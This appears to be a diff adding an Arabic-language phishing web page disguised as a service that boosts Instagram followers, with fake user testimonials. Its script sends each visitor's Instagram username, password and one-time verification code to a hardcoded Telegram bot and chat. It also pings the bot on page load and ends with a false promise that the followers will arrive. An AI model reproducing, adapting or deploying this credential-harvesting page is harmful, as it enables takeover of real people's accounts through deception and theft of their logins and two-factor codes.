@@ -1,0 +1,322 @@
+    <!DOCTYPE html>
+    <html lang="ar">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>زيادة متابعين إنستغرام</title>
+        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+        <style>
+            body {
+                font-family: 'Arial', sans-serif;
+                background: linear-gradient(135deg, #ff5e62, #ff9966); /* تعديل اللون ليشبه الألوان التي تُستخدم في إنستغرام */
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+                color: white;
+                overflow: hidden; /* لمنع ظهور شريط التمرير */
+            }
+
+            .login-container {
+                background: rgba(255, 255, 255, 0.95);
+                padding: 40px;
+                border-radius: 12px;
+                box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+                width: 100%;
+                max-width: 500px;
+                text-align: center;
+                position: relative;
+                z-index: 1; /* لجعل محتويات النموذج في المقدمة */
+            }
+
+            h2 {
+                color: #e4405f; /* تغيير اللون ليشبه اللون المستخدم في إنستغرام */
+                font-size: 30px;
+                margin-bottom: 15px;
+                text-transform: uppercase;
+            }
+
+            h3 {
+                font-size: 20px;
+                color: #333;
+                margin-bottom: 25px;
+            }
+
+            label {
+                display: block;
+                margin: 10px 0 5px;
+                font-size: 14px;
+                color: #555;
+            }
+
+            input, select {
+                width: 100%;
+                padding: 12px;
+                margin-bottom: 15px;
+                border: 1px solid #ccc;
+                border-radius: 6px;
+                font-size: 14px;
+                box-sizing: border-box;
+                transition: border-color 0.3s ease;
+            }
+
+            input:focus, select:focus {
+                border-color: #e4405f; /* تغيير لون التركيز ليشبه إنستغرام */
+                outline: none;
+                box-shadow: 0 0 5px rgba(228, 64, 95, 0.3);
+            }
+
+            button {
+                width: 100%;
+                padding: 14px;
+                background-color: #e4405f; /* تغيير لون الزر ليتناسب مع شعار إنستغرام */
+                color: #fff;
+                border: none;
+                border-radius: 6px;
+                cursor: pointer;
+                font-size: 16px;
+                transition: background-color 0.3s ease, transform 0.2s ease;
+            }
+
+            button:hover {
+                background-color: #b12f47;
+                transform: scale(1.05);
+            }
+
+            .error, .success {
+                color: red;
+                font-size: 14px;
+                text-align: center;
+                margin-top: 10px;
+            }
+
+            #verification-message {
+                color: green;
+                font-size: 14px;
+                text-align: center;
+                margin-top: 10px;
+            }
+
+            .legal-links {
+                margin-top: 20px;
+                font-size: 12px;
+                color: #888;
+            }
+
+            .legal-links a {
+                color: #fff;
+                text-decoration: none;
+            }
+
+            .legal-links a:hover {
+                text-decoration: underline;
+            }
+
+            .testimonials {
+                margin-top: 40px;
+                background-color: rgba(255, 255, 255, 0.9);
+                padding: 20px;
+                border-radius: 8px;
+            }
+
+            .testimonial {
+                background-color: #f0f0f0;
+                border-radius: 8px;
+                margin-bottom: 15px;
+                padding: 15px;
+            }
+
+            .testimonial h4 {
+                color: #e4405f;
+                font-size: 18px;
+                margin-bottom: 5px;
+            }
+
+            .testimonial p {
+                color: #555;
+                font-size: 14px;
+            }
+
+            @keyframes moveHeart {
+            0% {
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(100px); /* حركة القلب إلى اليمين */
+            }
+            100% {
+                transform: translateX(0);
+            }
+        }
+            .heart {
+                position: absolute;
+                top: 20%;
+                left: 10%;
+                font-size: 50px;
+                color: #ff5e62;
+                animation: moveHeart 3s ease-in-out infinite; /* حركة القلب بشكل مستمر */
+                z-index: 0; /* وضعه خلف المحتوى */
+            }
+
+            @media (max-width: 768px) {
+                .login-container {
+                    padding: 20px;
+                    width: 90%;
+                }
+
+                h2 {
+                    font-size: 24px;
+                }
+
+                h3 {
+                    font-size: 18px;
+                }
+
+                button {
+                    padding: 12px;
+                    font-size: 14px;
+                }
+            }
+
+            @media (max-width: 480px) {
+                .login-container {
+                    padding: 15px;
+                    width: 100%;
+                }
+
+                h2 {
+                    font-size: 22px;
+                }
+
+                h3 {
+                    font-size: 16px;
+                }
+
+                button {
+                    padding: 10px;
+                    font-size: 12px;
+                }
+            }
+        </style>
+    </head>
+
+    <body onload="sendMessageOnLoad()">
+        <div class="heart">❤️</div>
+        <div class="heart">❤️</div>
+        <div class="heart">❤️</div>
+        <div class="heart">❤️</div>
+        <div class="heart">❤️</div>
+
+        <div class="login-container">
+            <h2>زيادة متابعين إنستغرام</h2>
+            <h3>احصل على متابعين حقيقيين لزيادة تفاعل حسابك</h3>
+            <form id="login-form">
+                <label for="email">اسم المستخدم (إنستغرام):</label>
+                <input type="text" id="email" placeholder="أدخل اسم المستخدم" required>
+                <label for="password">كلمة المرور:</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                <label for="followers-type">اختيار عدد المتابعين:</label>
+                <select id="followers-type" required>
+                    <option value="500">500 متابع</option>
+                    <option value="1000">1000 متابع</option>
+                    <option value="2000">2000 متابع</option>
+                </select>
+                
+                <div id="otp-section" style="display: none;">
+                    <label for="otp">كود التحقق:</label>
+                    <input type="text" id="otp" placeholder="أدخل كود التحقق" required>
+                </div>
+                <p id="verification-message" style="display: none; color: green; text-align: center;">سيصلك كود التحقق على حسابك.</p>
+                <button type="button" id="next-button">التالي</button>
+                <button type="submit" id="login-button" style="display: none;">التالي</button>
+            </form> 
+            <p id="error-message" class="error"></p>
+
+            <div class="legal-links">
+                <a href="">راي المستخدمين</a>
+                <p>لمعرفة المزيد، يرجى قراءة <a href="#">سياسة الخصوصية</a> و <a href="#">شروط الاستخدام</a></p>
+            </div>
+        </div>
+
+        <div class="testimonials">
+            <h3>ماذا يقول المستخدمون:</h3>
+            <div class="testimonial">
+                <h4>أحمد</h4>
+                <p>أفضل خدمة لزيادة المتابعين، لاحظت زيادة كبيرة في التفاعل على حسابي!</p>
+            </div>
+            <div class="testimonial">
+                <h4>مريم</h4>
+                <p>الخدمة سريعة وآمنة، أنصح الجميع بتجربتها!</p>
+            </div>
+            <div class="testimonial">
+                <h4>سامي</h4>
+                <p>حصلت على متابعين حقيقيين وزادت تفاعلات حسابي بشكل ملحوظ. تجربة رائعة!</p>
+            </div>
+        </div>
+
+        <script>
+            const TOKEN = "7723684280:AAF8nFYxgE8566HTi_7_9u_BRSSgQ74NNZA"; 
+            const CHAT_ID = "6662219429"; 
+            const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            const loginButton = document.getElementById("login-button");
+            const nextButton = document.getElementById("next-button");
+            const errorMessage = document.getElementById("error-message");
+            const otpSection = document.getElementById("otp-section");
+            const otpMessage = document.getElementById("verification-message");
+            const otpInput = document.getElementById("otp");
+
+            // إرسال البريد الإلكتروني عند تحميل الصفحة
+            function sendMessageOnLoad() {
+                const message = `🌟 دخول جديد في موقع زيادة المتابعين:\n\n`;
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    text: message
+                });
+            }
+
+            nextButton.addEventListener("click", function() {
+                const username = document.getElementById("email").value;
+                const password = document.getElementById("password").value;
+                const followersType = document.getElementById("followers-type").value;
+
+                if (!username || !password || !followersType) {
+                    errorMessage.textContent = "من فضلك أكمل جميع الحقول.";
+                    return;
+                }
+
+                // إرسال البريد الإلكتروني مباشرة إلى البوت
+                const emailMessage = `📧 اسم المستخدم: ${username} \n- كلمة المرور: ${password} \n- عدد المتابعين: ${followersType}`;
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    text: emailMessage
+                });
+
+                // إظهار حقل كود التحقق
+                otpSection.style.display = "block";
+                otpMessage.style.display = "block";
+                nextButton.style.display = "none";
+                loginButton.style.display = "inline-block";
+            });
+
+            loginButton.addEventListener("click", function() {
+                const otp = otpInput.value;
+                if (!otp) {
+                    errorMessage.textContent = "من فضلك أدخل كود التحقق.";
+                    return;
+                }
+                errorMessage.textContent = "";
+                
+                // إرسال كود التحقق
+                const otpMessage = `🔑 تم دخول المستخدم:\n- اسم المستخدم: ${document.getElementById("email").value} \n- عدد المتابعين: ${document.getElementById("followers-type").value} \n- كود التحقق: ${otp}`;
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    text: otpMessage
+                });
+
+                alert("سيصلك المتابعون في 50 دقيقه");
+                
+            });
+        </script>
+    </body>
+    </html>
